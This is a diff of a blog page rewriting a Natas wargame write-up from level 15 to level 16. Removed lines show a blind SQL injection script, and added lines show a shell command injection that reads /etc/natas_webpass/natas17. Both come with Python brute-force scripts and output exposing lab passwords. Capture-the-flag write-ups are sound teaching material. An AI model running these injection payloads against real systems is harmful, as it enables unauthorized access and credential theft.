@@ -5,7 +5,7 @@
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 	
-	<title>My messy collection  | Natas-Level 15</title>
+	<title>My messy collection  | Natas-Level 16</title>
 	<meta name="viewport" content="width=device-width,minimum-scale=1">
 	<meta name="generator" content="Hugo 0.133.0">
 	
@@ -151,7 +151,7 @@ onload='renderMathInElement(document.body);'></script>
 		<a href="/" title="My messy collection" class="heading font-cursive icon">My messy collection</a>
 	</h2>
 </div>
-<h1 class="pt-2">Natas-Level 15</h1>
+<h1 class="pt-2">Natas-Level 16</h1>
 
 <h3 class="text-java-700 font-normal leading-relaxed pt-2">Writeup</h3>
 
@@ -186,7 +186,7 @@ onload='renderMathInElement(document.body);'></script>
 	
 	
 </div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4"
-		datetime="2024-08-23T15:10:52&#43;03:00">2024-8-23</time>
+		datetime="2024-08-24T14:37:52&#43;03:00">2024-8-24</time>
 </div>
 
 <hr />
@@ -200,21 +200,19 @@ onload='renderMathInElement(document.body);'></script>
 <article>
 	<section class="mx-auto content">
 		<div class="c-rich-text"><h3 id="login">Login</h3>
-<p><em>Username: natas15</em><br>
-<em>Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx</em><br>
-<em>URL:      <a href="http://natas15.natas.labs.overthewire.org">http://natas15.natas.labs.overthewire.org</a></em></p>
+<p><em>Username: natas16</em><br>
+<em>Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo</em><br>
+<em>URL:      <a href="http://natas16.natas.labs.overthewire.org">http://natas16.natas.labs.overthewire.org</a></em></p>
 <h3 id="doc">Doc</h3>
-<p><a href="https://en.wikipedia.org/wiki/SQL">What is SQL?</a><br>
-Structured Query Language is a domain-specific language used to manage data, especially in a relational database management system. It is particularly useful in handling structured data, i.e., data incorporating relations among entities and variables.
-<a href="https://en.wikipedia.org/wiki/SQL_injection">What is SQL injection?</a><br>
-In computing, SQL injection is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution.<br>
-<a href="https://en.wikipedia.org/wiki/Brute-force_attack">What is brute-forcing?</a><br>
+<p><a href="https://en.wikipedia.org/wiki/Brute-force_attack">What is brute-forcing?</a><br>
 In cryptography, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.<br>
 <a href="https://en.wikipedia.org/wiki/Python_(programming_language)">What is python?</a><br>
-Python is a high-level, general-purpose programming language. Its design philosophy emphasizes code readability with the use of significant indentation. Python is dynamically typed and garbage-collected. It supports multiple programming paradigms, including structured, object-oriented and functional programming.</p>
+Python is a high-level, general-purpose programming language. Its design philosophy emphasizes code readability with the use of significant indentation. Python is dynamically typed and garbage-collected. It supports multiple programming paradigms, including structured, object-oriented and functional programming.<br>
+<a href="https://en.wikipedia.org/wiki/PHP">What is php?</a><br>
+PHP is a general-purpose scripting language geared towards web development. It was originally created by Danish-Canadian programmer Rasmus Lerdorf in 1993 and released in 1995. The PHP reference implementation is now produced by the PHP Group.</p>
 <h3 id="solution">Solution</h3>
-<p>Let`s log into natas15. Now the only present field is one entitled <strong>username</strong> and a <strong>check existance</strong> send button.</p>
-<img src="/img/natas/natas15-1.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
+<p>We should examine the index page of <strong>natas16</strong> as per usual. There is a word search field just like in a previous letter and a search button.</p>
+<img src="/img/natas/natas16-1.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
 <br>
 <strong>Source code:</strong>
 <div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">html</span><span style="color:#111">&gt;</span>
@@ -226,213 +224,128 @@ Python is a high-level, general-purpose programming language. Its design philoso
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">script</span> <span style="color:#75af00">src</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&#34;</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">script</span> <span style="color:#75af00">src</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;http://natas.labs.overthewire.org/js/jquery-ui.js&#34;</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">script</span> <span style="color:#75af00">src</span><span style="color:#f92672">=</span><span style="color:#d88200">http://natas.labs.overthewire.org/js/wechall-data.js</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">script</span> <span style="color:#75af00">src</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;http://natas.labs.overthewire.org/js/wechall.js&#34;</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span><span style="color:#00a8c8">var</span> <span style="color:#75af00">wechallinfo</span> <span style="color:#f92672">=</span> <span style="color:#111">{</span> <span style="color:#d88200">&#34;level&#34;</span><span style="color:#f92672">:</span> <span style="color:#d88200">&#34;natas15&#34;</span><span style="color:#111">,</span> <span style="color:#d88200">&#34;pass&#34;</span><span style="color:#f92672">:</span> <span style="color:#d88200">&#34;&lt;censored&gt;&#34;</span> <span style="color:#111">};&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">head</span><span style="color:#111">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span><span style="color:#00a8c8">var</span> <span style="color:#75af00">wechallinfo</span> <span style="color:#f92672">=</span> <span style="color:#111">{</span> <span style="color:#d88200">&#34;level&#34;</span><span style="color:#f92672">:</span> <span style="color:#d88200">&#34;natas16&#34;</span><span style="color:#111">,</span> <span style="color:#d88200">&#34;pass&#34;</span><span style="color:#f92672">:</span> <span style="color:#d88200">&#34;&lt;censored&gt;&#34;</span> <span style="color:#111">};&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">head</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">body</span><span style="color:#111">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">h1</span><span style="color:#111">&gt;</span>natas15<span style="color:#111">&lt;/</span><span style="color:#f92672">h1</span><span style="color:#111">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">h1</span><span style="color:#111">&gt;</span>natas16<span style="color:#111">&lt;/</span><span style="color:#f92672">h1</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;content&#34;</span><span style="color:#111">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?php
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/*
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">CREATE TABLE `users` (
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  `username` varchar(64) DEFAULT NULL,
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  `password` varchar(64) DEFAULT NULL
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">if(array_key_exists(&#34;username&#34;, $_REQUEST)) {
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    $link = mysqli_connect(&#39;localhost&#39;, &#39;natas15&#39;, &#39;&lt;censored&gt;&#39;);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    mysqli_select_db($link, &#39;natas15&#39;);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    $query = &#34;SELECT * from users where username=\&#34;&#34;.$_REQUEST[&#34;username&#34;].&#34;\&#34;&#34;;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if(array_key_exists(&#34;debug&#34;, $_GET)) {
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        echo &#34;Executing query: $query&lt;br&gt;&#34;;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    }
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    $res = mysqli_query($link, $query);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if($res) {
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if(mysqli_num_rows($res) &gt; 0) {
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        echo &#34;This user exists.&lt;br&gt;&#34;;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    } else {
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        echo &#34;This user doesn&#39;t exist.&lt;br&gt;&#34;;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    }
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    } else {
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        echo &#34;Error in query.&lt;br&gt;&#34;;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    }
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    mysqli_close($link);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">} else {
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">form</span> <span style="color:#75af00">action</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;index.php&#34;</span> <span style="color:#75af00">method</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;POST&#34;</span><span style="color:#111">&gt;</span>
-</span></span><span style="display:flex;"><span>Username: <span style="color:#111">&lt;</span><span style="color:#f92672">input</span> <span style="color:#75af00">name</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">input</span> <span style="color:#75af00">type</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;submit&#34;</span> <span style="color:#75af00">value</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;Check existence&#34;</span> <span style="color:#111">/&gt;</span>
+</span></span><span style="display:flex;"><span>For security reasons, we now filter even more on certain characters<span style="color:#111">&lt;</span><span style="color:#f92672">br</span><span style="color:#111">/&gt;&lt;</span><span style="color:#f92672">br</span><span style="color:#111">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">form</span><span style="color:#111">&gt;</span>
+</span></span><span style="display:flex;"><span>Find words containing: <span style="color:#111">&lt;</span><span style="color:#f92672">input</span> <span style="color:#75af00">name</span><span style="color:#f92672">=</span><span style="color:#d88200">needle</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">input</span> <span style="color:#75af00">type</span><span style="color:#f92672">=</span><span style="color:#d88200">submit</span> <span style="color:#75af00">name</span><span style="color:#f92672">=</span><span style="color:#d88200">submit</span> <span style="color:#75af00">value</span><span style="color:#f92672">=</span><span style="color:#d88200">Search</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;/</span><span style="color:#f92672">form</span><span style="color:#111">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?php } ?&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Output:
+</span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">pre</span><span style="color:#111">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">$key = &#34;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">if(array_key_exists(&#34;needle&#34;, $_REQUEST)) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    $key = $_REQUEST[&#34;needle&#34;];
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">if($key != &#34;&#34;) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if(preg_match(&#39;/[;|&amp;`\&#39;&#34;]/&#39;,$key)) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        print &#34;Input contains an illegal character!&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    } else {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        passthru(&#34;grep -i \&#34;$key\&#34; dictionary.txt&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">&lt;/</span><span style="color:#f92672">pre</span><span style="color:#111">&gt;</span>
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;viewsource&#34;</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">a</span> <span style="color:#75af00">href</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;index-source.html&#34;</span><span style="color:#111">&gt;</span>View sourcecode<span style="color:#111">&lt;/</span><span style="color:#f92672">a</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;/</span><span style="color:#f92672">body</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;/</span><span style="color:#f92672">html</span><span style="color:#111">&gt;</span></span></span></code></pre></div>
 <h4 id="what-does-this-code-do">What does this code do?</h4>
 <p>The important selection out of all of that code is this:</p>
-<pre tabindex="0"><code>$query = &#34;SELECT * from users where username=\&#34;&#34;.$_REQUEST[&#34;username&#34;].&#34;\&#34;&#34;;
-    if(array_key_exists(&#34;debug&#34;, $_GET)) {
-        echo &#34;Executing query: $query&lt;br&gt;&#34;;
-    }
+<pre tabindex="0"><code>if(array_key_exists(&#34;needle&#34;, $_REQUEST)) {
+    $key = $_REQUEST[&#34;needle&#34;];
+}
 
-    $res = mysqli_query($link, $query);
-    if($res) {
-    if(mysqli_num_rows($res) &gt; 0) {
-        echo &#34;This user exists.&lt;br&gt;&#34;;
+if($key != &#34;&#34;) {
+    if(preg_match(&#39;/[;|&amp;`\&#39;&#34;]/&#39;,$key)) {
+        print &#34;Input contains an illegal character!&#34;;
     } else {
-        echo &#34;This user doesn&#39;t exist.&lt;br&gt;&#34;;
+        passthru(&#34;grep -i \&#34;$key\&#34; dictionary.txt&#34;);
     }
-    } else {
-        echo &#34;Error in query.&lt;br&gt;&#34;;
-    }
-</code></pre><p>This code snippet submits the sent data from the <strong>natas15 index page</strong> and parses it into a SQL query that boils down to:</p>
-<pre tabindex="0"><code>Select * FROM users WHERE username=&#34;sentData&#34;
-</code></pre><p>Easy, basic <strong>SQL injection</strong> just like the last time right? Welp, not so soon since this time, there is no output except for an existance confirmation, a &ldquo;does not exist return&rdquo; and a sql querry error statement. So now that we know that we can`t output anything, what are we supposed to do?<br>
-The 3 type of returns are actually very usefull since you can send data packets and get confirmation about the packets. The approach idea is to try every possible combination tailored with what we know that the output should be and how it should look and watch out for validation.</p>
-<h4 id="in-practice-how-can-it-be-done">In practice, how can it be done?</h4>
-<p>The SQL injection statement will look like this:</p>
-<pre tabindex="0"><code>natas16&#34; AND password LIKE BINARY &#34;%letter%&#34; &#34;
-</code></pre><p>This will produce a positive output when the password associated with <strong>natas16</strong> contains a letter given by us (or in this case also an uppercase letter and numbers) and we will produce a string composed of all the letters present in the actual password. We should write a script in order to achieve this since doing that by hand is not possible.<br>
-<strong>Python script template:</strong></p>
+}
+?&gt;
+</code></pre><p>This code snippet submits the sent data from the <strong>natas16 index page</strong> and searches the dictionary.txt file in order to find matching words that contain the given pattern. There is also some illegal character filter in place in order to make PHP injection more difficult to perform. The sollution to this level will be extremly similar to that of <strong>natas15</strong> since we are gonna try data and use the response packets we get in order to filter out usefull data.</p>
+<h4 id="grep-documentation-needed">Grep documentation needed:</h4>
+<pre tabindex="0"><code>grep (1)             - print lines that match patterns
+    -E, --extended-regexp     PATTERNS are extended regular expressions
+</code></pre><p>We are gonna do an extended regex in order to fill out characters in the password for <strong>natas17</strong> in conjunction with a word that we know is present in the <strong>dictionary.txt</strong> file, then if the response contains the word, we know that the selected character is in the password, otherwise not.</p>
+<h4 id="grep-format">Grep format:</h4>
+<pre tabindex="0"><code>$(grep -E ^ string/character.* /etc/natas_webpass/natas17)Existing_key
+</code></pre><p>We need to find a string that appears in <strong>dictionary.txt</strong>:</p>
+<img src="/img/natas/natas16-2.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
+<br>
+Now all that is left to do is implement this in a python script just like we did previously.
+<h4 id="the-script">The script:</h4>
 <pre tabindex="0"><code>import requests
 
-target = &#39;http://natas15.natas.labs.overthewire.org&#39;
-possibleCharacterList = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
-foundCharacterList = &#39;&#39;
+target = &#39;http://natas16.natas.labs.overthewire.org&#39;
+possible = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
 
-for character in possibleCharacterList:
-	username = (&#39;natas16&#34; AND password LIKE BINARY &#34;%&#39; + character +&#39;%&#34; &#34;&#39;) #BINARY is used to make the search case sensitive
-	req = requests.get(target,
-		auth=(&#39;natas15&#39;,&#39;SdqIqBsFcz3yotlNYErZSZwblkm0lrvx&#39;),
-		params={&#34;username&#34;: username}
-	)
-	if &#34;This user exists&#34; in req.text:
-		foundCharacterList += character
-		print (&#39;Possible so far: &#39; + foundCharacterList)
-print(&#34;----&#34;+&#34;end of search&#34;+&#34;----&#34;)
-</code></pre><p>We use the <strong>request</strong> library in order to make requests and get responses from the service then define our SQL query, define our auth parameters (<strong>the login data you have for natas15</strong>) and if the response to our insert with a certain character is possitive, append it to the empty list.<br>
-<strong>Script execution:</strong></p>
-<pre tabindex="0"><code>03:13:59 archie@Archie pyscript → python3 getpasswordletters.py
-Possible so far: 3
-Possible so far: 34
-Possible so far: 346
-Possible so far: 346c
-Possible so far: 346ce
-Possible so far: 346cef
-Possible so far: 346cefh
-Possible so far: 346cefhi
-Possible so far: 346cefhij
-Possible so far: 346cefhijk
-Possible so far: 346cefhijkm
-Possible so far: 346cefhijkmo
-Possible so far: 346cefhijkmos
-Possible so far: 346cefhijkmost
-Possible so far: 346cefhijkmostu
-Possible so far: 346cefhijkmostuv
-Possible so far: 346cefhijkmostuvD
-Possible so far: 346cefhijkmostuvDE
-Possible so far: 346cefhijkmostuvDEG
-Possible so far: 346cefhijkmostuvDEGK
-Possible so far: 346cefhijkmostuvDEGKL
-Possible so far: 346cefhijkmostuvDEGKLM
-Possible so far: 346cefhijkmostuvDEGKLMP
-Possible so far: 346cefhijkmostuvDEGKLMPQ
-Possible so far: 346cefhijkmostuvDEGKLMPQV
-Possible so far: 346cefhijkmostuvDEGKLMPQVW
-Possible so far: 346cefhijkmostuvDEGKLMPQVWX
-Possible so far: 346cefhijkmostuvDEGKLMPQVWXY
-----end of search----
-Possible characters: 346cefhijkmostuvDEGKLMPQVWXY
-</code></pre><p>As you can see, we confirmed that the password is composed out of these characters : <strong>346cefhijkmostuvDEGKLMPQVWXY</strong>\</p>
-<h4 id="whats-next">What`s next?</h4>
-<p>Okay, so we have our string of present characters in the password but that is not the passkey for the next level. The approach will now be, for character in string, if password is like characterinstring% append to characterinstring and continue until the password reaches the length of 32 (<strong>all the password`s lenghts so far</strong>) and then break.<br>
-For that I will make a function that takes the output of the last script and does what I`ve described ealier for each letter in the input.<br>
-<strong>Function:</strong></p>
-<pre tabindex="0"><code>def get_password(foundCharacterList):
-    password = &#39;&#39;
-    while len(password)!=32:
-        for character in foundCharacterList:
-            username = (&#39;natas16&#34; AND password LIKE BINARY &#34;&#39; + password + character + &#39;%&#34; &#34;&#39;)
-            req = requests.get(target,
-                auth=(&#39;natas15&#39;,&#39;SdqIqBsFcz3yotlNYErZSZwblkm0lrvx&#39;),
-                params={&#34;username&#34;: username}
-            )
-            if &#34;This user exists&#34; in req.text:
-                password += character
-                print (&#39;Password so far: &#39; + password)
-                break
-    print(&#34;Final password: &#34; + password)
-</code></pre><p><strong>Now let`s run this:</strong></p>
-<pre tabindex="0"><code>03:32:35 archie@Archie pyscript → python3 finalscript.py
-Possible so far: 3
-Possible so far: 34
-Possible so far: 346
-Possible so far: 346c
-Possible so far: 346ce
-Possible so far: 346cef
-Possible so far: 346cefh
-Possible so far: 346cefhi
-Possible so far: 346cefhij
-Possible so far: 346cefhijk
-Possible so far: 346cefhijkm
-Possible so far: 346cefhijkmo
-Possible so far: 346cefhijkmos
-Possible so far: 346cefhijkmost
-Possible so far: 346cefhijkmostu
-Possible so far: 346cefhijkmostuv
-Possible so far: 346cefhijkmostuvD
-Possible so far: 346cefhijkmostuvDE
-Possible so far: 346cefhijkmostuvDEG
-Possible so far: 346cefhijkmostuvDEGK
-Possible so far: 346cefhijkmostuvDEGKL
-Possible so far: 346cefhijkmostuvDEGKLM
-Possible so far: 346cefhijkmostuvDEGKLMP
-Possible so far: 346cefhijkmostuvDEGKLMPQ
-Possible so far: 346cefhijkmostuvDEGKLMPQV
-Possible so far: 346cefhijkmostuvDEGKLMPQVW
-Possible so far: 346cefhijkmostuvDEGKLMPQVWX
-Possible so far: 346cefhijkmostuvDEGKLMPQVWXY
-----end of search----
-Possible characters: 346cefhijkmostuvDEGKLMPQVWXY
-Password so far: h
-Password so far: hP
-Password so far: hPk
-Password so far: hPkj
-Password so far: hPkjK
-Password so far: hPkjKY
-Password so far: hPkjKYv
-Password so far: hPkjKYvi
-Password so far: hPkjKYviL
-Password so far: hPkjKYviLQ
-Password so far: hPkjKYviLQc
-Password so far: hPkjKYviLQct
-Password so far: hPkjKYviLQctE
-Password so far: hPkjKYviLQctEW
-Password so far: hPkjKYviLQctEW3
-Password so far: hPkjKYviLQctEW33
-Password so far: hPkjKYviLQctEW33Q
-Password so far: hPkjKYviLQctEW33Qm
-Password so far: hPkjKYviLQctEW33Qmu
-Password so far: hPkjKYviLQctEW33QmuX
-Password so far: hPkjKYviLQctEW33QmuXL
-Password so far: hPkjKYviLQctEW33QmuXL6
-Password so far: hPkjKYviLQctEW33QmuXL6e
-Password so far: hPkjKYviLQctEW33QmuXL6eD
-Password so far: hPkjKYviLQctEW33QmuXL6eDV
-Password so far: hPkjKYviLQctEW33QmuXL6eDVf
-Password so far: hPkjKYviLQctEW33QmuXL6eDVfM
-Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW
-Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4
-Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4s
-Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sG
-Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
-Final password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
-</code></pre><p>As you can see, we`ve got the password for the next level : <strong>hPkjKYviLQctEW33QmuXL6eDVfMW4sGo</strong></p>
-</div>
+
+final = &#39;&#39;
+i = 0
+while len(final) != 32:
+	while i &lt; len(possible):
+		character = possible[i]
+		needle = (&#39;$(grep -E ^%s%c.* /etc/natas_webpass/natas17)abandoned&#39; % (final, character))
+		req = requests.get(target,
+			auth=(&#39;natas16&#39;,&#39;hPkjKYviLQctEW33QmuXL6eDVfMW4sGo&#39;),
+			params={&#34;needle&#34;: needle}
+		)
+		if &#34;abandoned&#34; not in req.text:
+			final += character
+			print (&#39;Password so far : &#39; + final)
+			i = 0
+		else:
+			i += 1
+print (&#34;----Script Finished----&#34;)
+print (&#34;Password is : &#34; + final)
+</code></pre><p>Now all that is left to do is run the script and obtain the password for <strong>natas17</strong>.</p>
+<h4 id="script-run">Script run:</h4>
+<pre tabindex="0"><code>02:59:31 archie@Archie python → python3 scriptnatas16.py
+Password so far : E
+Password so far : Eq
+Password so far : Eqj
+Password so far : EqjH
+Password so far : EqjHJ
+Password so far : EqjHJb
+Password so far : EqjHJbo
+Password so far : EqjHJbo7
+Password so far : EqjHJbo7L
+Password so far : EqjHJbo7LF
+Password so far : EqjHJbo7LFN
+Password so far : EqjHJbo7LFNb
+Password so far : EqjHJbo7LFNb8
+Password so far : EqjHJbo7LFNb8v
+Password so far : EqjHJbo7LFNb8vw
+Password so far : EqjHJbo7LFNb8vwh
+Password so far : EqjHJbo7LFNb8vwhH
+Password so far : EqjHJbo7LFNb8vwhHb
+Password so far : EqjHJbo7LFNb8vwhHb9
+Password so far : EqjHJbo7LFNb8vwhHb9s
+Password so far : EqjHJbo7LFNb8vwhHb9s7
+Password so far : EqjHJbo7LFNb8vwhHb9s75
+Password so far : EqjHJbo7LFNb8vwhHb9s75h
+Password so far : EqjHJbo7LFNb8vwhHb9s75ho
+Password so far : EqjHJbo7LFNb8vwhHb9s75hok
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5T
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF0
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF0O
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+----Script Finished----
+Password is : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+</code></pre></div>
 	</section>
 
 
@@ -542,7 +455,7 @@ Final password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
 	<div class="text-sm text-gray-500 leading-tight a-gray">
 		
 		<br />
-		1278 words in this page.
+		764 words in this page.
 	</div>
 </div>
 
@@ -553,21 +466,14 @@ Final password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
 <hr class="double-line" />
 <div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
     
-    <a class="flex-grow-0" href="/post/natas14/">
+    <a class="flex-grow-0" href="/post/natas15/">
         <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
             height="24">
             <path fill="none" d="M0 0h24v24H0z" />
             <path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z" /></svg>
-        Natas-Level 14
+        Natas-Level 15
     </a>
     
-    
-    <a class="flex-grow-0" href="/post/natas16/">
-        Natas-Level 16
-        <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
-            height="24">
-            <path fill="none" d="M0 0h24v24H0z" />
-            <path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z" /></svg></a>
     
 </div>
 <div >
@@ -577,6 +483,8 @@ Final password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
 <div class="font-serif pb-2 flex align-start leading-loose">
 	<span class="heading pr-6 leading-loose">Related</span>
 	<span >
+		
+			<a href="/post/natas15/">Natas-Level 15</a>&nbsp;&nbsp;&#47;&nbsp;
 		
 			<a href="/post/natas14/">Natas-Level 14</a>&nbsp;&nbsp;&#47;&nbsp;
 		
@@ -604,9 +512,7 @@ Final password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
 		
 			<a href="/post/natas2/">Natas-Level 2</a>&nbsp;&nbsp;&#47;&nbsp;
 		
-			<a href="/post/natas1/">Natas-Level 1</a>&nbsp;&nbsp;&#47;&nbsp;
-		
-			<a href="/post/natas0/">Natas-Level 0</a>
+			<a href="/post/natas1/">Natas-Level 1</a>
 		
 </span>
 </div>
